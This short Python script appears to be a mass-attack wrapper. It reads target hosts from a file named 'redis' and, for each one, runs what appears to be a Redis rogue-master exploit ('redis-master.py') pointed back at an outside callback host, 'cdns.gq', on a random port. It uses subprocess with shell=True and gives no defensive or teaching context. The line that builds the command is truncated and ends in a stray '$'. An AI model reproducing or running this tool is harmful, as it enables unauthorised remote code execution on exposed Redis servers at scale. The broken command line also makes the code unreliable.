import random
import subprocess

def main():

        fileHandler = open ("redis", "r")
        listOfLines = fileHandler.readlines()
        fileHandler.close()
        for line in listOfLines:
                host= line.strip()
                r = random.randint(40000,50000)
                cmd = 'python3 redis-master.py -r ' + host + ' -L cdns.gq -P ' + str(r) + ' $
                print('========> running against host: ' + host)
                print('========> running against port: ' + str(r))
                print('========> command : ' + cmd)
                try:
                        subprocess.run(cmd, timeout=5, shell=True)
                except subprocess.TimeoutExpired:
                        print('process ran too long')

if __name__ == '__main__':
        main()
